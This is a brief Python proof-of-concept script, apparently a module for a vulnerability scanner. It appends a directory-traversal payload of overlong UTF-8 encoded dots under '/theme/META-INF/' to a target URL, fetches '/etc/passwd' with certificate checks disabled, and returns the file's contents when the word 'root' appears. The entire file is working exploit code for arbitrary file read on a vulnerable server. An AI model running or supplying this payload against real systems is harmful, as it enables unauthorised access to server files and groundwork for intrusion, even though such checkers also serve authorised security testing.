#-*-coding:utf-8-*-
import sys
import requests
import txconfig

def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success": False,
        "flag":{},
        "result": {}
    }
    try:
        url = param['url']
    except Exception as e:
        result['result'] = e
        return result
    payload = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
    url = url + payload
    Re = requests.get(url,headers=headers,verify=False,allow_redirects=False)
    if "root" in Re.text:
        result['success'] = True
        result['flag'] = Re.text
        return result
    else:
        return result

